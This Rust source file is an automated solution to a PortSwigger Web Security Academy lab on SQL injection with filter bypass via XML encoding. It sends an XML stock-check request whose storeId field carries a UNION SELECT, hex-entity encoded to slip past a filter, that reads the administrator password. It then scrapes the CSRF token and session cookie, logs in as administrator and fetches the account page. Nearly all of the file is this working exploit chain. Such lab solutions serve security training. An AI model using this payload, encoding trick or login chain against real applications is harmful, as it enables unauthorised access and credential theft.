/***************************************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 27/9/2023
*
* Lab: SQL injection with filter bypass via XML encoding
*
* Steps: 1. Inject payload into storeId XML element to retrieve administrator password
*           using UNION-based attack
*        2. Extract administrator password from the response body
*        3. Fetch the login page
*        4. Extract csrf token and session cookie
*        5. Login as the administrator
*        6. Fetch the administrator profile
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0af80068031e1d5d820d1a8a00d4007a.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!("{} {}", "[#] Injection point:".blue(), "storeId".yellow(),);

    // payload to retrieve administrator password
    let payload = r###"<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>
            3
        </productId>
        <storeId>
            1 &#x55;NION &#x53;ELECT password FROM users WHERE username = &#x27;administrator&#x27;
        </storeId>
    </stockCheck>"###;

    print!(
        "{}",
        "1. Injecting payload to retrieve administrator password using UNION-based attack.. "
            .white(),
    );
    io::stdout().flush();

    // fetch the page with the injected payload
    let injection = client
        .post(format!("{url}/product/stock"))
        .header("Content-Type", "application/xml")
        .body(payload)
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch the page with the injected payload".red()
        ));

    println!("{}", "OK".green());
    print!(
        "{}",
        "2. Extracting administrator password from the response.. ".white(),
    );
    io::stdout().flush();

    // get the body of the response
    let body = injection.text().unwrap();

    // extract administrator password.
    // if the pattern not work, change it to "(.*)\n",
    // it depends on how the password is retrieved, after the the number of units or before them
    // the 2 scenarios occured when I made tests, so be ready to face either of them
    let admin_password = capture_pattern("\n(.*)", &body).expect(&format!(
        "{}",
        "[!] Failed to extract administrator password".red()
    ));

    println!("{} => {}", "OK".green(), admin_password.yellow());
    print!("{}", "3. Fetching login page.. ".white());
    io::stdout().flush();

    // fetch the login page
    let fetch_login = client
        .get(format!("{url}/login"))
        .send()
        .expect(&format!("{}", "[!] Failed to fetch login page".red()));

    println!("{}", "OK".green());
    print!(
        "{}",
        "4. Extracting csrf token and session cookie.. ".white()
    );
    io::stdout().flush();

    // extract session cookie
    let session = extract_session_cookie(fetch_login.headers())
        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));

    // extract csrf token
    let csrf =
        extract_csrf(fetch_login).expect(&format!("{}", "[!] Failed to extract csrf token".red()));

    println!("{}", "OK".green());
    print!("{}", "5. Logging in as the administrator.. ".white(),);
    io::stdout().flush();

    // login as the administrator
    let admin_login = client
        .post(format!("{url}/login"))
        .form(&HashMap::from([
            ("username", "administrator"),
            ("password", &admin_password),
            ("csrf", &csrf),
        ]))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to login as the administrator".red()
        ));

    println!("{}", "OK".green());

    // extract the new session
    let new_session = extract_session_cookie(admin_login.headers()).expect(&format!(
        "{}",
        "[!] Failed to extract new session cookie".red()
    ));

    print!("{}", "6. Fetching the administrator profile.. ".white(),);
    io::stdout().flush();

    // fetch administrator page
    let admin = client
        .get(format!("{url}/my-account"))
        .header("Cookie", format!("session={new_session}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to fetch administrator profile".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

/********************************************
* Function to capture a pattern form a text
*********************************************/
fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.captures(text) {
        Some(text.get(1).unwrap().as_str().to_string())
    } else {
        None
    }
}

/*************************************************
* Function to extract csrf from the response body
**************************************************/
fn extract_csrf(res: Response) -> Option<String> {
    if let Some(csrf) = Document::from(res.text().unwrap().as_str())
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
    {
        Some(csrf.to_string())
    } else {
        None
    }
}

/**********************************************************
* Function to extract session field from the cookie header
***********************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
        Some(session.as_str().to_string())
    } else {
        None
    }
}

/*******************************************
* Function to extract a pattern form a text
********************************************/
fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
    let pattern = Regex::new(pattern).unwrap();
    if let Some(text) = pattern.find(text) {
        Some(text.as_str().to_string())
    } else {
        None
    }
}
